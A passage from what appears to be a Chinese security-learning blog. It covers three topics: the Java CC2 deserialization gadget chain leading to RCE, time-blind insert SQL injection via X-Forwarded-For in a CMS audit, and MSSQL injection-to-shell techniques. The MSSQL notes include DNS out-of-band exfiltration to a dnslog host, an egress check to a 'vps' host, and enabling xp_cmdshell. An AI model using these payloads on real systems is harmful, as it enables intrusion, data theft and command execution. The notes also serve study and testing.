<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.通过invokeTransformer的transform(这里利用comparator类)方法调用newtransformer</span></span><br><span class="line">InvokerTransformer transformer=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span>  Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">TransformingComparator comparator =<span class="keyword">new</span> TransformingComparator(transformer);<span class="comment">//使用TransformingComparator修饰器传入newtransformer</span></span><br></pre></td></tr></table></figure>
<p>这里通过反射调用newTransformer方法。<br>我们知道最终还是需要调用invokertransformer类的tranform方法，需要找到一个类里的方法能调用transform方法，TransformingComparator是一个修饰器，和CC1中的ChainedTransformer类似，里面有compare方法会调用transform方法，实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以通过PriorityQueue队列触发compare()，进一步触发transform()。继续</p>
<h2 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h2><p>考虑如何调用compare方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);<span class="comment">//使用指定的初始容量创建一个  PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line"></span><br><span class="line">Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//获取PriorityQueue的comparator字段</span></span><br><span class="line">field2.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field2.set(queue,comparator);<span class="comment">//设置queue的comparator字段值为comparator</span></span><br></pre></td></tr></table></figure>
<p>问题：为什么要设置该类的这个字段？注意设置的字段值传入的就是poc里的comparator实例，是需要进一步调用compare方法触发transfrom方法的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看这几个方法，首先comparator.compare会被siftDownUsingComparator方法调用。<br>siftDownUsingComparator–&gt;siftDown–&gt;heapify()</p>
<h2 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field field3=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);<span class="comment">//获取queue的queue字段</span></span><br><span class="line">field3.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field3.set(queue,<span class="keyword">new</span> Object[]&#123;templatesImpl,templatesImpl&#125;);<span class="comment">//设置queue的queue字段内容Object数组，内容为templatesImpl</span></span><br></pre></td></tr></table></figure>
<p>最后就是readobject复写点了，PriorityQueue的readobject代码实现如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后调用heapify()实现了反序列化rce。</p>
<h2 id="正向跟一波"><a href="#正向跟一波" class="headerlink" title="正向跟一波"></a>正向跟一波</h2><p>调试跟一遍</p>
<p>1.反序列化我们构造的对象进入PriorityQueue的readobject方法最后调用heapify方法<br><img src="/2021/03/19/cc2%E9%93%BE/3.png" alt="3"><br>heapify会调用siftDown方法，并且传入queue，这里的queue是刚刚传入的构造好恶意代码的TemplatesImpl实例化对象。</p>
<p><img src="/2021/03/19/cc2%E9%93%BE/4.png" alt="4"></p>
<p>进而调用siftdown方法<br><img src="/2021/03/19/cc2%E9%93%BE/5.png" alt="5"></p>
<p>这里的comparator就是poc里设置的字段值也就是TransformingComparator修饰过的InvokerTransformer实例化对象</p>
<p>继续进入siftDownUsingComparator</p>
<p><img src="/2021/03/19/cc2%E9%93%BE/6.png" alt="6"></p>
<p>小结：PriorityQueue类<br>readObject–&gt;heapify()–&gt;siftDown()–&gt;siftDownUsingComparator()–&gt;comparator.compare()<br>在PriorityQueue中构造方法comparator是可控的。</p>
<p>这里调用TransformingComparator的compare方法，跟进</p>
<p><img src="/2021/03/19/cc2%E9%93%BE/7.png" alt="7"></p>
<p>在这里传入的2个参数，内容为TemplatesImpl实例化对象<br><img src="/2021/03/19/cc2%E9%93%BE/8.png" alt="8"></p>
<p>最后调用newtransform方法，然后继续调用TransformerImpl<br>小结：TransformingComparator中compare函数会调用transform方法，解决调用transform方法的问题。templatesImpl解决runtime实例化的问题</p>
<p><img src="/2021/03/19/cc2%E9%93%BE/9.png" alt="9"><br>首先是会判断_name的值是否为空，之前通过反射设置过该值为test，进入下一个语句是判断_class是否为空，进入defineTransletClasses方法</p>
<p><img src="/2021/03/19/cc2%E9%93%BE/10.png" alt="10"></p>
<p>进入之后经过判断将_bytecodes赋值给_class<br><img src="/2021/03/19/cc2%E9%93%BE/11.png" alt="11"></p>
<p>赋值完成后继续回到getTransletInstance方法将生成的payload类实例化，即将我们的恶意字节码实例化<br><img src="/2021/03/19/cc2%E9%93%BE/12.png" alt="12"></p>
<p>直接弹出计算器是因为javassist生成的类执行的payload在静态代码块里，当我们new一个对象就会执行功能。</p>
<p>Runtime执行命令代码是在静态代码块里面，静态代码块会在new对象的时候去执行。</p>
<p>其实很多细节方面都没有说到，计划接下来java会跟着yso工具学习</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">审计某cms到insert注入技巧</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-03-12 19:28:02 / Modified: 21:57:16" itemprop="dateCreated datePublished" datetime="2021-03-12T19:28:02+08:00">2021-03-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">PHP代码审计</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="记一次审计实战以及insert注入技巧"><a href="#记一次审计实战以及insert注入技巧" class="headerlink" title="记一次审计实战以及insert注入技巧"></a>记一次审计实战以及insert注入技巧</h1><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>这是做项目碰到的一个cms，根据特征发现github上有源码，下载进行审计。后台长这样</p>
<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1.png" alt="1"></p>
<p>该漏洞成因是因为后台登陆某个存在的账户过多时会进行锁定，并将此记录到数据库中。<br><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/2.png" alt="2"></p>
<p>当锁定用户时会进入记录IP并进入logHandler类的initAndWriteLog方法，部分实现代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initAndWriteLog</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$msg</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$internalKey</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$username</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$action</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$itemid</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$itemname</span> = <span class="string">&quot;&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params"> </span>) </span>&#123;</span><br><span class="line">     <span class="variable">$modx</span> = evolutionCMS();</span><br><span class="line">     ........</span><br><span class="line">     <span class="keyword">$this</span>-&gt;writeToLog();</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>然后会调用writeToLog方法写入日志：</p>
<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/3.png" alt="3"></p>
<p>定义$fields数组最后插入到数据库中，后面的代码应该就是遍历数组插入数据库。继续跟进getuserip的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( array_key_exists(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>, <span class="variable">$_SERVER</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>], <span class="string">&#x27;,&#x27;</span>)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> trim(<span class="variable">$addr</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里获取X_FORWARDED_FOR的值并返回，注意这里会将逗号分隔，其他的没有什么限制，所以注入的话就不能用逗号。</p>
<p>为了方便，我根据代码实现一个类似的简单功能：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="string">&quot;我们的payload&quot;</span>;</span><br><span class="line">    <span class="variable">$addr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">    <span class="variable">$fields</span>[<span class="string">&#x27;message&#x27;</span>] = <span class="string">&#x27;asdgas&#x27;</span>;</span><br><span class="line">    <span class="variable">$fields</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$addr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$fields</span>[<span class="string">&#x27;useragent&#x27;</span>] = <span class="string">&#x27;asdgasdg&#x27;</span>;</span><br><span class="line">    <span class="variable">$fields</span> = <span class="string">&quot;(`&quot;</span> . implode(<span class="string">&quot;`, `&quot;</span>, array_keys(<span class="variable">$fields</span>)) . <span class="string">&quot;`) VALUES(&#x27;&quot;</span> .  implode(<span class="string">&quot;&#x27;, &#x27;&quot;</span>,array_values(<span class="variable">$fields</span>)) . <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">    var_dump(<span class="variable">$fields</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后将$fields插入代码中执行insert语句,最后成功延时。<br><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/4.png" alt="4"></p>
<h2 id="insert注入脱坑"><a href="#insert注入脱坑" class="headerlink" title="insert注入脱坑"></a>insert注入脱坑</h2><p>这里报错注入是用不了的，只能是时间盲注加不使用逗号，其实常规注入就可以，只是本地测试发现一些小问题记录一下。</p>
<ul>
<li>逗号能使用的情况</li>
</ul>
<p>利用substr函数构造if语句即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)&#x3D;&#39;p&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)&#x3D;&#39;r&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);</span><br><span class="line">Query OK, 1 row affected (5.01 sec)</span><br></pre></td></tr></table></figure>
<ul>
<li>不能使用逗号的情况</li>
</ul>
<p>先给出三个语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into test values (&quot;adn&quot;,&#39;1&#39; (select case when substr((select user()) from 1 for 1)&#x3D;&#39;r&#39; then sleep(5) else 0 end) &#39;1&#39;,&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">insert into test values (&quot;adn&quot;,&#39;1&#39;+(select case when substr((select user()) from 1 for 1)&#x3D;&#39;r&#39; then sleep(5) else 0 end)+&#39;1&#39;,&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">insert into test values (&quot;adn&quot;,&#39;1&#39; and (select case when substr((select user()) from 1 for 1)&#x3D;&#39;r&#39; then sleep(5) else 0 end) and &#39;1&#39;,&quot;admin&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>第一个语句肯定是会报错的，原理说不上来。<br>来看第二第三个语句，前者是运算符拼接，后者是and连接，并且插入的数据也不一样，前提是能执行成功如果执行结果为0是不会插入数据库的。</p>
<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/5.png" alt="5"></p>
<p>但是发现一个问题：</p>
<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/6.png" alt="6"></p>
<p>为什么这三个语句只能有一个执行成功呢，字符在and语句中是0,个人觉得如果and语句第一个条件是0的话后面的就不会执行，mysql会直接判断为0。</p>
<p>我们换一下位置</p>
<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/7.png" alt="7"></p>
<p>果然第一个and语句会执行，所以当为and的时候要用insert into test values (“adn”,’1’ and (select case when substr((select user()) from 1 for 1)=’r’ then sleep(5) else 0 end) and ‘1’,”admin”);至少第一个要为数字或者是1</p>
<p>运算符+的情况为空或者数字都行<br><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/8.png" alt="8"></p>
<p>其实是个很简单的东西，只是在本地测试的时候犯下很多糊涂，算是记录一下长长记性，钻研问题就从小问题开始对吧。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/" class="post-title-link" itemprop="url">mssql注入getshell</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-03-04 21:01:57" itemprop="dateCreated datePublished" datetime="2021-03-04T21:01:57+08:00">2021-03-04</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-03-12 23:18:58" itemprop="dateModified" datetime="2021-03-12T23:18:58+08:00">2021-03-12</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h1><p>总结一下实战用的比较多的getshell姿势</p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
<li><p>sqlserver不支持limit，支持top关键字select top 1 * from users</p>
</li>
<li><p>mssql2000：遇到过一次是dba</p>
</li>
<li><p>mssql2005：权限一般是system</p>
</li>
<li><p>mssql2008:  nt authority\network service</p>
</li>
<li><p>数据文件为.mdf和.ndf</p>
</li>
<li><p>日志文件为,ldf</p>
</li>
<li><p>数据的默认路径：C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data</p>
</li>
</ul>
<h2 id="数据库体系"><a href="#数据库体系" class="headerlink" title="数据库体系"></a>数据库体系</h2><p>1.和Oracle不同和db2类似，一个实例对应多个数据库</p>
<p>2.默认的5个数据库master、model、msdb、Resource、tempdb<br>其中打交道比较多的就是master,里面有很多存储过程可以执行命令。<br><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/1.png" alt="1"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>select @@version<br><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/2.png" alt="2"><br>是否支持堆叠<br>;waitfor delay ‘0:0:5’<br>是否是dba<br><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/3.png" alt="3"><br>是否有回显</p>
<ul>
<li>命令执行无回显</li>
</ul>
<p>1.将命令执行结果写入表<br><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/4.png" alt="4"><br>2.dns带外</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * into temp_trc from fn_trace_gettable(&#39;\\&#39;+(select @@version())+&#39;.xxx.dnslog.cn\1.trc&#39;,default);</span><br></pre></td></tr></table></figure>
<p>是否出网</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-WebRequest -Uri http:&#x2F;&#x2F;vps&#x2F;</span><br></pre></td></tr></table></figure>
<p>是否站库分离</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host_name()&#x3D;@@servername</span><br><span class="line">uname&#x3D;test&#39;;if(host_name()&#x3D;@@servername) WAITFOR DELAY &#39;0:0:5&#39;;--</span><br></pre></td></tr></table></figure>
<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>SQL Server 2005默认是关闭的所以需要开启cmdshell<br>开启方式（高权限）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#39;show advanced options&#39;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1; </span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure>
<p>declare 函数，他是mssql声明局部变量的函数, declare定义变量 set设置变量值 exec执行变量</p>
<p>命令执行select * from test where id=1 if 1=1 execute xp_cmdshell ‘whoami’<br><img src="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/5.png" alt="5"></p>
<ul>
<li>不支持堆叠的情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;, </span><br><span class="line">1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;exec xp_cmdshell </span><br><span class="line">&#39;&#39;dir&#39;&#39;&#39;);</span><br></pre></td></tr></table></figure>
